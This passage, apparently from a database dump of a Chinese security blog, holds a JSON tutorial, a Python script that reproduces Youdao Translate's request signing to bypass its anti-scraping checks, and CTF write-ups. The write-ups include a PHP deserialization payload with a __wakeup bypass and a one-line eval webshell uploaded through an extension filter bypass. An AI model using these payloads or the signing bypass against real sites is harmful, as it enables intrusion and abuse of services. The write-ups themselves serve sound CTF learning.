访问、修改和删除\r\n\r\n打开浏览器控制台，通过 JavaScript，创建一个对象数组，并像这样进行赋值：\r\n\r\n```javascript\r\nvar teachers = [{\"name\": \"Nick\", \"age\": 30}, {\"name\": \"Marry\", \"age\": 35}]\r\n```\r\n\r\n### 访问\r\n\r\n使用`teachers[0]`可以访问对象数组第一个对象。\r\n\r\n![7](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/7.png)\r\n\r\n可以使用`teachers[0].name`访问JavaScript对象数组的值。\r\n\r\n![1](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/1.png)\r\n\r\n除此之外使用`teachers[0][\"name\"]`也可以访问JavaScript对象数组的值。\r\n\r\n### 修改\r\n\r\n修改对象数组中的值。\r\n\r\n![2](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/2.png)\r\n\r\n### 删除\r\n\r\n使用`delete teachers[0]`可以删除对象数组第一个值。\r\n\r\n![8](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/8.png)\r\n\r\n`delete teachers[0].name`或者`delete teachers[0][\"name\"]`都可以删除该对象的**name**属性。\r\n\r\n如下图所示：\r\n\r\n![5](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/5.png)\r\n\r\n## 遍历对象\r\n\r\n### 遍历对象的属性\r\n\r\n使用`for-in`来遍历对象中的属性。\r\n\r\n```javascript\r\nvar teachers = {\"name\": \"Nick\", \"age\": 30};\r\n\r\nfor (x in teachers) {\r\n     console.log(x);\r\n}\r\n```\r\n\r\n在控制台输出如下：\r\n\r\n![3](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/3.png)\r\n\r\n### 遍历属性的值\r\n\r\n在 `for-in`循环对象的属性时，使用中括号来访问属性的值。\r\n\r\n```javascript\r\nvar teachers = {\"name\": \"Nick\", \"age\": 30};\r\n\r\nfor (x in teachers) {\r\n     console.log(teachers[x]);\r\n}\r\n```\r\n\r\n在控制台输出如下：\r\n\r\n![4](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/4.png)\r\n\r\n## 遍历数组\r\n\r\n使用`for-in`遍历数组。\r\n\r\n```javascript\r\nvar myschool = {\r\n    \"school\": \"1st school\",\r\n    \"teachers\":[\r\n    	{\"name\": \"Nick\", \"age\": 30},\r\n    	{\"name\": \"Marry\", \"age\": 35}\r\n	]\r\n};\r\n\r\nfor (x in myschool.teachers){\r\n     console.log(myschool.teachers[x].name);\r\n}\r\n```\r\n\r\n在控制台输出如下：\r\n\r\n![6](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/6.png)\r\n\r\n# JSON字符串与JS对象的转换\r\n\r\n## `parse()`\r\n\r\n> `parse()`将JSON字符串转换为JavaScript对象。\r\n\r\n### 语法\r\n\r\n```javascript\r\nvar obj = JSON.parse(str[, reviver]);\r\n```\r\n\r\n* `str`为必须，一个有效的JSON字符串。\r\n\r\n* `reviver` 可选，一个转换结果的函数， 将为对象的每个成员调用此函数。\r\n\r\n我们从服务端获取了如下数据：\r\n\r\n```json\r\n{\"name\": \"Marry\", \"nation\":\"USA\", \"age\": 30}\r\n```\r\n\r\n利用`JSON.parse()`处理以上数据：\r\n\r\n```javascript\r\nvar per = JSON.parse(\'{\"name\": \"Marry\", \"nation\":\"USA\", \"age\": 30}\');\r\n```\r\n\r\n解析完成后就可以使用从该JSON字符串转化的JavaScript对象了。\r\n\r\n### 从服务端接收JSON\r\n\r\n使用AJAX从服务端请求JSON数据并解析为JavaScript对象。\r\n\r\n利用`XMLHttpRequest()`函数创造一个新的请求对象。\r\n\r\n```javascript\r\nvar request = new XMLHttpRequest(); \r\n```\r\n\r\n当`readystate`改变时就会触发`onreadystatechange`事件。（详见[AJAX – onreadystatechange 事件](https://www.runoob.com/ajax/ajax-xmlhttprequest-onreadystatechange.html)）\r\n\r\n在 onreadystatechange 事件中，我们规定当服务器响应已做好被处理的准备时所执行的任务。\r\n\r\n```javascript\r\nvar request = new XMLHttpRequest(); \r\n\r\nrequest.onreadystatechange = function() {\r\n    if (this.readyState==4 && this.status==200)\r\n    {\r\n        Obj = JSON.parse(this.responseText);\r\n        console.log(Obj.name);\r\n    }\r\n}\r\n```\r\n\r\n最后发送`request`请求。\r\n\r\n```javascript\r\nvar request = new XMLHttpRequest(); \r\n\r\nrequest.onreadystatechange = function() {\r\n    if (this.readyState==4 && this.status==200)\r\n    {\r\n        Obj = JSON.parse(this.responseText);\r\n        console.log(Obj.name);\r\n    }\r\n}\r\n\r\nrequest.open(\"GET\", url);\r\nrequest.send();\r\n```\r\n\r\n### 实例\r\n\r\n新建一个**mytest**文件夹。\r\n\r\n创建一个`json`格式的文件，将下面数据写入，并放入**mytest**文件夹下的**JSON**目录下。\r\n\r\n```json\r\n{\r\n  \"school\": \"1st school\",\r\n  \"stunum\": 30000,\r\n  \"teachers\": [\r\n    {\r\n      \"name\": \"Nick\",\r\n      \"age\": 30\r\n    },\r\n    {\r\n      \"name\": \"Marry\",\r\n      \"age\": 35\r\n    }\r\n  ]\r\n}\r\n```\r\n\r\n在**mytest**目录下创建一个`html`文件。\r\n\r\n```html\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<meta charset=\"utf-8\">\r\n</head>\r\n<body>\r\n\r\n<h1>从服务端接收JSON数据</h1>\r\n<p id=\"demo\"></p>\r\n\r\n<script>\r\n\r\nvar request = new XMLHttpRequest(); \r\n\r\nrequest.onreadystatechange = function() {\r\n    if (this.readyState==4 && this.status==200)\r\n    {\r\n        Obj = JSON.parse(this.responseText);\r\n        document.getElementById(\"demo\").innerHTML = Obj.school;\r\n    }\r\n}\r\n\r\nrequest.open(\"GET\", \"/JSON/jsontest.json\", true);\r\nrequest.send();\r\n\r\n</script>\r\n\r\n<p>查看<a href=\"/JSON/jsontest.json\" target=\"_blank\">JSON</a>文件数据</p>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n使用**phpstudy**，将**mytest**文件夹放在其**WWW**目录下，打开网站。\r\n\r\n![9](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/9.png)\r\n\r\n![10](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/10.png)\r\n\r\n##  `stringify()`\r\n\r\n> `stringify()`JavaScript对象转换为JSON字符串。\r\n\r\n### 语法\r\n\r\n```javascript\r\nvar obj = JSON.stringify(value[, replacer[, space]]);\r\n```\r\n\r\n* **value**为必须，是需要转换的**JavaScript**对象或者数组。\r\n* **replacer**为可选，用于转换结果的函数或数组。\r\n  1. 如果**replacer**为函数，则`JSON.stringify`将调用该函数，并传入每个成员的键和值。使用返回值而不是原始值。如果此函数返回 undefined，则排除成员\r\n  2. 如果**replacer**是一个数组，会遍历数组的值，以数组的值作为value的属性。如果value原本包含该属性，那么显示该属性，如果不包含则不显示。\r\n\r\n* **space**为可选，文本添加缩进、空格和换行符。\r\n\r\n### 实例\r\n\r\n```javascript\r\nvar obj = { name: \"Marry\", nation: \"USA\", age: 30};\r\nvar myJSON = JSON.stringify(obj);\r\ndocument.getElementById(\"demo\").innerHTML = myJSON;\r\n```\r\n\r\n在控制台的结果如下图所示：\r\n\r\n![11](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/18/11.png)\r\n\r\n# JSON工具\r\n\r\n[JSON在线解析工具](https://c.runoob.com/front-end/53/)',2,'1670929847279','https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/1c51f37965d2ae52ae5f07ebd0bffd00.jpeg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080'),('破解有道反爬机制调用翻译api','admin','2022-12-13 19:11','652240843@qq.com','# 源代码（Python实现）\r\n\r\n用Python绕过有道翻译的反爬虫措施，调用翻译接口，实现单词和短句的翻译和用法解析。效果如图所示。\r\n\r\n![2](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/21/2.png)\r\n\r\n话不多说先上代码。\r\n\r\n```python\r\nimport requests\r\nimport random\r\nimport hashlib\r\nimport time\r\n\r\n\r\ndef salt_sign(e):\r\n    navigator_appVersion = \"5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"\r\n    t = hashlib.md5(navigator_appVersion.encode(\"utf-8\")).hexdigest()\r\n    r = str(int(time.time() * 1000))\r\n    i = r + str(random.randint(1, 10))\r\n    return {\r\n        \"ts\": r,\r\n        \"bv\": t,\r\n        \"salt\": i,\r\n        \"sign\": hashlib.md5(str(\"fanyideskweb\" + e + i + \"Ygy_4c=r#e#4EX^NUGUc5\").encode(\"utf-8\")).hexdigest()\r\n    }\r\n\r\n\r\ndef translate(word):\r\n    url = \'http://fanyi.youdao.com/translate_o?smartresult=dict&smartresult=rule\'\r\n    r = salt_sign(word)\r\n    data = {\r\n        \"i\": word,\r\n        \"from\": \"AUTO\",\r\n        \"to\": \"AUTO\",\r\n        \"smartresult\": \"dict\",\r\n        \"client\": \"fanyideskweb\",\r\n        \"salt\": r[\"salt\"],\r\n        \"sign\": r[\"sign\"],\r\n        \"lts\": r[\"ts\"],\r\n        \"bv\": r[\"bv\"],\r\n        \"doctype\": \"json\",\r\n        \"version\": \"2.1\",\r\n        \"keyfrom\": \"fanyi.web\",\r\n        \"action\": \"FY_BY_REALTlME\"\r\n    }\r\n    headers = {\r\n        \"Cookie\": \"OUTFOX_SEARCH_USER_ID=-286220249@10.108.160.17;\",\r\n        \"Referer\": \"http://fanyi.youdao.com/\",\r\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\",\r\n    }\r\n    res = requests.post(url=url, data=data, headers=headers).json()\r\n    print(word + \"的译文：\" + res[\'translateResult\'][0][0][\'tgt\'])\r\n    print(\"翻译类型：\" + res[\'type\'])\r\n    print(\"用法（一）：\" + res[\'smartResult\'][\'entries\'][0])\r\n    print(\"用法（二）：\" + res[\'smartResult\'][\'entries\'][1])\r\n\r\n\r\nif __name__ == \'__main__\':\r\n    while True:\r\n        try:\r\n            word = input(\"请输入你要翻译的单词或短句:\")\r\n            translate(word)\r\n        except Exception as e:\r\n            print(\"错误:\", e)\r\n```\r\n\r\n# 实现过程\r\n\r\n## 寻找接口\r\n\r\n目标网址：[有道翻译](https://fanyi.youdao.com/)\r\n\r\n随便翻译一个单词，<kbd>F12</kbd>进入控制台，选择网络，选择`XHR`查看，很快就发现了一个接口。\r\n\r\n![1](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/21/1.png)\r\n\r\n查看发送请求的表单数据，是用`json`传递的数据，我们就可以用Python发送请求。实现很简单。\r\n\r\n```python\r\nimport requests\r\n\r\n\r\ndef translate(word):\r\n    url = \'http://fanyi.youdao.com/translate_o?smartresult=dict&smartresult=rule\'\r\n    data = {\r\n        \"i\": word,\r\n        \"from\": \"AUTO\",\r\n        \"to\": \"AUTO\",\r\n        \"smartresult\": \"dict\",\r\n        \"client\": \"fanyideskweb\",\r\n        \"salt\": \"16632096342368\",\r\n        \"sign\": \"f68df14c3fd6c01e6820cd3ffd826e55\",\r\n        \"lts\": \"1663209634236\",\r\n        \"bv\": \"47edca4d7e6ec9bf4fca7156ea36b8ef\",\r\n        \"doctype\": \"json\",\r\n        \"version\": \"2.1\",\r\n        \"keyfrom\": \"fanyi.web\",\r\n        \"action\": \"FY_BY_REALTlME\"\r\n    }\r\n    headers = {\r\n        \"Cookie\": \"OUTFOX_SEARCH_USER_ID=-286220249@10.108.160.17;\",\r\n        \"Referer\": \"http://fanyi.youdao.com/\",\r\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\",\r\n    }\r\n    res = requests.post(url=url, data=data, headers=headers).json()\r\n    print(res)\r\n\r\n\r\nif __name__ == \'__main__\':\r\n    while True:\r\n        try:\r\n            word = input(\"请输入你要查询的字符串:\")\r\n            translate(word)\r\n        except Exception as e:\r\n            print(\"错误:\", e)\r\n```\r\n\r\n随意输入一个单词，居然报错了，怎会如此？\r\n\r\n![3](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/21/3.png)\r\n\r\n## 破解反爬措施\r\n\r\n还是来分析一下表单数据吧：\r\n\r\n```python\r\ndata = {\r\n	\"i\": word,\r\n    \"from\": \"AUTO\",\r\n    \"to\": \"AUTO\",\r\n    \"smartresult\": \"dict\",\r\n    \"client\": \"fanyideskweb\",\r\n	\"salt\": r[\"salt\"],\r\n	\"sign\": r[\"sign\"],\r\n	\"lts\": r[\"ts\"],\r\n	\"bv\": r[\"bv\"],\r\n	\"doctype\": \"json\",\r\n	\"version\": \"2.1\",\r\n	\"keyfrom\": \"fanyi.web\",\r\n	\"action\": \"FY_BY_REALTlME\"\r\n}\r\n```\r\n\r\n改变输入的单词，发现`salt`、`sign`、`lts`、`bv`每次都变化，而且很容易看出来`sign`和`salt`经过**md5**加密。这可能是有道设置的反爬措施，和之前写过的token很类似。[暴力破解之token绕过](https://www.tsuk1.com/2022/08/12/10/)\r\n\r\n我们来分析一下有道翻译的网页源代码，找一下这几个数据是怎么生成的。\r\n\r\n发现了一个名为**fanyi.min.js**的脚本，猜测这四个数据可能就是这个脚本生成的。打开[源代码](https://shared.ydstatic.com/fanyi/newweb/v1.1.10/scripts/newweb/fanyi.min.js)，密密麻麻一大堆还没有格式化。\r\n\r\n![](21/4.png)\r\n\r\n搜索一下关于`sign`和`salt`等的代码部分。找到了，格式化一下得到了下面这部分关键代码。\r\n\r\n![5](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/21/5.png)\r\n\r\n```javascript\r\nvar r = function (e) {\r\n    var t = n.md5(navigator.appVersion),\r\n        r = \"\" + (new Date)\r\n            .getTime(),\r\n        i = r + parseInt(10 * Math.random(), 10);\r\n    return {\r\n        ts: r,\r\n        bv: t,\r\n        salt: i,\r\n        sign: n.md5(\"fanyideskweb\" + e + i + \"Ygy_4c=r#e#4EX^NUGUc5\")\r\n    }\r\n};\r\nt.recordUpdate = function (e) {\r\n    var t = e.i,\r\n        i = r(t);\r\n    n.ajax({\r\n        type: \"POST\",\r\n        contentType: \"application/x-www-form-urlencoded; charset=UTF-8\",\r\n        url: \"/bettertranslation\",\r\n        data: {\r\n            i: e.i,\r\n            client: \"fanyideskweb\",\r\n            salt: i.salt,\r\n            sign: i.sign,\r\n            lts: i.ts,\r\n            bv: i.bv,\r\n            tgt: e.tgt,\r\n            modifiedTgt: e.modifiedTgt,\r\n            from: e.from,\r\n            to: e.to\r\n        },\r\n        success: function (e) { },\r\n        error: function (e) { }\r\n    })\r\n}, t.recordMoreResultLog_get = function (e) {\r\n    n.ajax({\r\n        type: \"POST\",\r\n        contentType: \"application/x-www-form-urlencoded; charset=UTF-8\",\r\n        url: \"/ctlog\",\r\n        data: {\r\n            i: e.i,\r\n            action: \"GET_MORE_TRANSLATION\",\r\n            from: e.from,\r\n            to: e.to\r\n        },\r\n        success: function (e) { },\r\n        error: function (e) { }\r\n    })\r\n}, t.recordMoreResultLog_choose = function (e) {\r\n    n.ajax({\r\n        type: \"POST\",\r\n        contentType: \"application/x-www-form-urlencoded; charset=UTF-8\",\r\n        url: \"/ctlog\",\r\n        data: {\r\n            i: e.i,\r\n            tgt: e.tgt,\r\n            systemName: e.systemName,\r\n            pos: e.pos,\r\n            action: \"SELECT_OTHER_TRANSLATION\",\r\n            from: e.from,\r\n            to: e.to\r\n        },\r\n        success: function (e) { },\r\n        error: function (e) { }\r\n    })\r\n};\r\n```\r\n\r\n后面就很简单了，分析一下这段代码。总结一下表单各参数的释义。\r\n\r\n```plaintext\r\ni：需要进行翻译的字符串\r\nfrom：被翻译语言的语种\r\nto：翻译后的语言的语种\r\nsmartresult：智能结果，固定值\r\nclient：客户端，固定值\r\nsalt：加密用到的盐值，待定\r\nsign：签名字符串，待定\r\nlts：毫秒时间戳\r\nbv：未知的md5值，固定值\r\ndoctype：文档类型，固定值\r\nversion：版本，固定值\r\nkeyfrom：键来源，固定值\r\naction：操作动作，固定值\r\n```\r\n\r\n根据源代码分析`salt`、`sign`、`lts`、`bv`的规律。\r\n\r\n```javascript\r\n# 最关键代码\r\nvar r = function (e) {\r\n    var t = n.md5(navigator.appVersion),\r\n        r = \"\" + (new Date)\r\n            .getTime(),\r\n        i = r + parseInt(10 * Math.random(), 10);\r\n    return {\r\n        ts: r,\r\n        bv: t,\r\n        salt: i,\r\n        sign: n.md5(\"fanyideskweb\" + e + i + \"Ygy_4c=r#e#4EX^NUGUc5\")\r\n    }\r\n};\r\n```\r\n\r\n- salt：当前毫秒时间戳与10以内随机数字字符串的拼接\r\n- sign：\"fanyideskweb\"+i+salt+\"Ygy_4c=r#e#4EX^NUGUc5\"的md5值\r\n- ts：当前毫秒时间戳\r\n- bv: 浏览器版本md5值\r\n\r\n所以绕过就很简单了。这是获取`salt`、`sign`、`lts`、`bv`四个值的函数。代码实现很简单，就不多解释了。\r\n\r\n```python\r\ndef salt_sign(e):\r\n    navigator_appVersion = \"5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"\r\n    t = hashlib.md5(navigator_appVersion.encode(\"utf-8\")).hexdigest()\r\n    r = str(int(time.time() * 1000))\r\n    i = r + str(random.randint(1, 10))\r\n    return {\r\n        \"ts\": r,\r\n        \"bv\": t,\r\n        \"salt\": i,\r\n        \"sign\": hashlib.md5(str(\"fanyideskweb\" + e + i + \"Ygy_4c=r#e#4EX^NUGUc5\").encode(\"utf-8\")).hexdigest()\r\n    }\r\n```\r\n\r\n## 格式化返回的JSON数据\r\n\r\n返回的数据是JSON格式的，既然是实现翻译功能，当然需要解析一下这个数据了，更好看懂。\r\n\r\n```json\r\n{\r\n    \'errorCode\': 0, \r\n 	\'translateResult\': [[{\'tgt\': \'你好\', \'src\': \'hello\'}]], \r\n 	\'type\': \'en2zh-CHS\', \r\n 	\'smartResult\': {\'entries\': [\'\', \'int. 喂，你好（用于问候或打招呼）；喂，你好（打电话时的招呼语）；喂，你好（引起别人注	意的招呼语）；<非正式>喂，嘿 (认为别人说了蠢话或分心)；<英，旧>嘿（表示惊讶）\\r\\n\', \'n. 招呼，问候；（Hello）（法、印、		美、俄）埃洛（人名）\\r\\n\', \'v. 说（或大声说）“喂”；打招呼\\r\\n\'], \'type\': 1}\r\n}\r\n```\r\n\r\n解析如下：\r\n\r\n```python\r\n    res = requests.post(url=url, data=data, headers=headers).json()\r\n    print(word + \"的译文：\" + res[\'translateResult\'][0][0][\'tgt\'])\r\n    print(\"翻译类型：\" + res[\'type\'])\r\n    print(\"用法（一）：\" + res[\'smartResult\'][\'entries\'][0])\r\n    print(\"用法（二）：\" + res[\'smartResult\'][\'entries\'][1])\r\n```\r\n\r\n\r\n\r\n## 最终代码\r\n\r\n```python\r\nimport requests\r\nimport random\r\nimport hashlib\r\nimport time\r\n\r\n\r\ndef salt_sign(e):\r\n    navigator_appVersion = \"5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"\r\n    t = hashlib.md5(navigator_appVersion.encode(\"utf-8\")).hexdigest()\r\n    r = str(int(time.time() * 1000))\r\n    i = r + str(random.randint(1, 10))\r\n    return {\r\n        \"ts\": r,\r\n        \"bv\": t,\r\n        \"salt\": i,\r\n        \"sign\": hashlib.md5(str(\"fanyideskweb\" + e + i + \"Ygy_4c=r#e#4EX^NUGUc5\").encode(\"utf-8\")).hexdigest()\r\n    }\r\n\r\n\r\ndef translate(word):\r\n    url = \'http://fanyi.youdao.com/translate_o?smartresult=dict&smartresult=rule\'\r\n    r = salt_sign(word)\r\n    data = {\r\n        \"i\": word,\r\n        \"from\": \"AUTO\",\r\n        \"to\": \"AUTO\",\r\n        \"smartresult\": \"dict\",\r\n        \"client\": \"fanyideskweb\",\r\n        \"salt\": r[\"salt\"],\r\n        \"sign\": r[\"sign\"],\r\n        \"lts\": r[\"ts\"],\r\n        \"bv\": r[\"bv\"],\r\n        \"doctype\": \"json\",\r\n        \"version\": \"2.1\",\r\n        \"keyfrom\": \"fanyi.web\",\r\n        \"action\": \"FY_BY_REALTlME\"\r\n    }\r\n    headers = {\r\n        \"Cookie\": \"OUTFOX_SEARCH_USER_ID=-286220249@10.108.160.17;\",\r\n        \"Referer\": \"http://fanyi.youdao.com/\",\r\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\",\r\n    }\r\n    res = requests.post(url=url, data=data, headers=headers).json()\r\n    print(word + \"的译文：\" + res[\'translateResult\'][0][0][\'tgt\'])\r\n    print(\"翻译类型：\" + res[\'type\'])\r\n    print(\"用法（一）：\" + res[\'smartResult\'][\'entries\'][0])\r\n    print(\"用法（二）：\" + res[\'smartResult\'][\'entries\'][1])\r\n\r\n\r\nif __name__ == \'__main__\':\r\n    while True:\r\n        try:\r\n            word = input(\"请输入你要翻译的单词或短句:\")\r\n            translate(word)\r\n        except Exception as e:\r\n            print(\"错误:\", e)\r\n```\r\n\r\n\r\n\r\n\r\n',1,'1670929906890','https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e1981cbfd071904de882344620304b89.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080'),('极客大挑战2019 PHP','admin','2022-12-13 19:12','652240843@qq.com','\r\n# 敏感备份文件\r\n\r\n打开网址，这只小猫真的很好玩，前端大佬，膜！！！\r\n\r\n根据他提示的信息，直接上**dirsearch**扫盘。\r\n\r\n![1](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/23/1.png)\r\n\r\n这文件可真够多的，不过我只需要备份文件。好！找到你了，`www.zip`。然后就是把这个文件下载下来了。\r\n\r\n![2](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/23/2.png)\r\n\r\n![3](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/23/3.png)\r\n\r\n# 分析代码\r\n\r\n先看看**index.php**里面，这里接收了一个**GET**参数。最重要的是`unserialize(@$select)`，估计又离不开反序列化了。\r\n\r\n```php\r\n<?php\r\n    include \'class.php\';\r\n    $select = $_GET[\'select\'];\r\n    $res=unserialize(@$select);\r\n?>\r\n```\r\n\r\n然后分析**class.php**里的代码，这里定义了一个类，魔术方法`__destruct()`在销毁对象时使用，当该对象的`$username`为`admin`且`$password`为`100`时能够得到**flag**。\r\n\r\n魔术方法`__wakeup()`在实例化对象时使用，这里将对象的`$username`赋值为`guest`，所以我们需要绕过他。\r\n\r\n```php\r\n<?php\r\ninclude \'flag.php\';\r\n\r\n\r\nerror_reporting(0);\r\n\r\n\r\nclass Name{\r\n    private $username = \'nonono\';\r\n    private $password = \'yesyes\';\r\n\r\n    public function __construct($username,$password){\r\n        $this->username = $username;\r\n        $this->password = $password;\r\n    }\r\n\r\n    function __wakeup(){\r\n        $this->username = \'guest\';\r\n    }\r\n\r\n    function __destruct(){\r\n        if ($this->password != 100) {\r\n            echo \"</br>NO!!!hacker!!!</br>\";\r\n            echo \"You name is: \";\r\n            echo $this->username;echo \"</br>\";\r\n            echo \"You password is: \";\r\n            echo $this->password;echo \"</br>\";\r\n            die();\r\n        }\r\n        if ($this->username === \'admin\') {\r\n            global $flag;\r\n            echo $flag;\r\n        }else{\r\n            echo \"</br>hello my friend~~</br>sorry i can\'t give you the flag!\";\r\n            die();\r\n        }\r\n    }\r\n}\r\n?>\r\n```\r\n\r\n代码分析完毕，接下来思路就很清晰了，用**GET**方式传递一个经过序列化`$username`为`admin`且`$password`为`100`的对象实例，然后绕过魔术方法`__wakeup()`，即可拿下**flag**\r\n\r\n# 序列化构造payload\r\n\r\n跑一下这段脚本，得到我们需要的序列化后的对象。\r\n\r\n```php\r\n<?php\r\n    class Name{\r\n        private $username = \'nonono\';\r\n        private $password = \'yesyes\';\r\n    \r\n        public function __construct($username,$password){\r\n            $this->username = $username;\r\n            this->password = $password;\r\n        }\r\n    }\r\n    $a = new Name(\'admin\', 100);\r\n    var_dump(serialize($a));\r\n?>\r\n```\r\n\r\n运行结果为\r\n\r\n```php\r\nO:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\r\n```\r\n\r\n还没有结束，因为类的两个属性声明为`private`，所以需要补上`00`的空字符。\r\n\r\n```php\r\nO:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\r\n```\r\n\r\n如何绕过`__wakeup()`呢？\r\n\r\n{% tip success %}当反序列化中对象属性的个数和真实的个数不等时，__wakeup() 就会被绕过。{% endtip %}\r\n\r\n所以最后的payload为\r\n\r\n```php\r\nO:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\r\n```\r\n\r\n# 拿下flag\r\n\r\n传参\r\n\r\n```plaintext\r\n?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\r\n```\r\n\r\n得到flag，收工。\r\n\r\n![4](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/23/4.png)\r\n',2,'1670929948487','https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/b290bfb19005caeedfb1b91f75554335.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_3840%2ch_2160'),('ACTF2020 新生赛 Upload','admin','2022-12-13 19:13','652240843@qq.com','# 找到上传点\r\n\r\n鼠标移动到灯泡上就可以看到一个文件上传表单出现。\r\n\r\n![1](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/24/1.png)\r\n\r\n试一下**一句话木马**，上传**shell.php**。\r\n\r\n```php\r\n<?php eval($_POST[\'shell\']) ?>\r\n```\r\n\r\n弹窗告诉我们只能上传jpg、png、gif格式的文件。\r\n\r\n![2](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/24/2.png)\r\n\r\n# 绕过文件验证\r\n\r\n查看网页源代码，发现前端对文件格式进行了验证，删掉这个`onsubmit`事件再上传。\r\n\r\n```html\r\n<form enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\">\r\n```\r\n\r\n回显`nonono~ Bad file！`，上传还是失败，可能后端也对文件格式进行了过滤。\r\n\r\n用burpsuite抓包，改包改掉**shell.php**的后缀名，改为**shell.phtml**，然后放包。\r\n\r\n可以看到前端回显上传文件的目录地址，上传成功。\r\n\r\n![3](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/24/3.png)\r\n\r\n# 蚁剑连接\r\n\r\n添加数据，**URL**一栏填网站+上传一句话的目录位置，比如我的是：\r\n\r\n```plaintext\r\nhttp://446fb0a2-7e51-47e8-b47b-54bb6a39b3f7.node4.buuoj.cn:81//uplo4d/bd914ca4997d34857501cefab0064162.phtml\r\n```\r\n\r\n![4](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/24/4.png)\r\n\r\n连接成功，发现**flag**就在根目录。\r\n\r\n![5](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/24/5.png)\r\n',2,'1670929982704','https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/01b018d6242ccec4e099562fbc19375f.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080'),('江苏工匠杯 easyphp','admin','2022-12-13 19:13','652240843@qq.com','# 题目概览\r\n\r\n一进来引入眼帘的就是一段PHP。\r\n\r\n<img src=\"https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/22/9/27/image-20220926212016805.png\" alt=\"image-20220926212016805\" style=\"zoom: 67%;\" />\r\n\r\n```php\r\n<?php\r\nhighlight_file(__FILE__);\r\n$key1 = 0;\r\n$key2 = 0;\r\n\r\n$a = $_GET[\'a\'];\r\n$b = $_GET[\'b\'];\r\n\r\nif(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){\r\n    if(isset($b) && \'8b184b\' === substr(md5($b),-6,6)){\r\n        $key1 = 1;\r\n        }else{\r\n            die(\"Emmm...再想想\");\r\n        }\r\n    }else{\r\n    die(\"Emmm...\");\r\n}\r\n\r\n$c=(array)json_decode(@$_GET[\'c\']);\r\nif(is_array($c) && !is_numeric(@$c[\"m\"]) && $c[\"m\"] > 2022){\r\n    if(is_array(@$c[\"n\"]) && count($c[\"n\"]) == 2 && is_array($c[\"n\"][0])){\r\n        $d = array_search(\"DGGJ\", $c[\"n\"]);\r\n        $d === false?die(\"no...\"):NULL;\r\n        foreach($c[\"n\"] as $key=>$val){\r\n            $val===\"DGGJ\"?die(\"no......\"):NULL;\r\n        }\r\n        $key2 = 1;\r\n    }else{\r\n        die(\"no hack\");\r\n    }\r\n}else{\r\n    die(\"no\");\r\n}\r\n\r\nif($key1 && $key2){\r\n    include \"Hgfks.php\";\r\n    echo \"You\'re right\".\"\\n\";\r\n}\r\n\r\n?>\r\n```\r\n\r\n分析一下代码吧。**GET**传三个参数**a**、**b**、**c**，满足一系列条件让`$key1=1 && $key2=1`,然后获取**flag**。\r\n\r\n# 参数a\r\n\r\na只有这一小段戏码。`intval($a)`将`$a`转化成整数然后要满足大于**6000000**同时长度小于等于3。怎么办？可以想到使用科学计数法。\r\n\r\n所以**a=6e7**。\r\n\r\n```php\r\nif(isset($a) && intval($a) > 6000000 && strlen($a) <= 3)\r\n```\r\n\r\n# 参数b\r\n\r\n```php\r\nif(isset($b) && \'8b184b\' === substr(md5($b),-6,6))\r\n```\r\n\r\n这段代码截取`$b`经过**md5**加密后的最后六位字符，需要满足`=== 